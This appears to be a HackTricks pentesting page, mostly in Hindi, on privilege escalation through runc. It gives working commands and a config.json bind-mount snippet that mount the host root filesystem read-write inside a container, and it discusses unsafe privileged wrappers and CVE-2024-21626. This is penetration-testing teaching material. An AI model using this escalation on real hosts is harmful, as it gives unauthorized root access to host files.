# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

**runc** के बारे में और जानने के लिए यह पेज देखें:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

यदि host पर किसी rootful process के लिए `runc` उपलब्ध है, तो आप ऐसा OCI bundle इस्तेमाल कर सकते हैं जिसकी mount configuration host के `/` को container के अंदर `/` पर recursively bind-mount करती है। इससे उस mount namespace में host का filesystem दिखाई देने लगता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> दस्तावेज़ीकृत `runc run` workflow rootful है: runc के अपने उदाहरण इसे “run as root” कहते हैं। किसी unprivileged user को `runc spec --rootless` जैसी rootless configuration चाहिए, और runc के दस्तावेज़ कहते हैं कि इस mode के लिए user namespaces सक्षम होने चाहिए।<sup>[[1]](#references)</sup>

## Privileged wrappers और runtime versions

कॉलर-नियंत्रित OCI bundle स्वीकार करने वाला privileged wrapper, असुरक्षित bind mounts की अनुमति देने पर host files तक पहुँच उजागर कर सकता है। जाँचें कि wrapper mount sources और destinations को validate करने से पहले path traversal और symlinks को resolve करता है या नहीं, और क्या वह `process.cwd` को सीमित करता है। केवल sudo rule या writable `config.json` से यह साबित नहीं होता कि wrapper bundle स्वीकार करेगा या उसे host privileges के साथ चलाएगा।

अलग से, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) ने upstream `runc` के `1.0.0-rc93` से `1.1.11` तक के versions को प्रभावित किया; `1.1.12` में upstream fix मौजूद है। Leaked file descriptors और अपर्याप्त working-directory validation के कारण, कुछ `runc run` या `runc exec` workflows में container process अपने root के बाहर जा सकती थी। File-descriptor numbers invocation पर निर्भर करते हैं, और केवल version string से exploitability साबित नहीं होती—खासकर जब vendor ने fixes backport किए हों या caller privileged runtime invocation को प्रभावित न कर सकता हो।

## References

- [1] [runc: containers को spawn और run करने का CLI tool](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
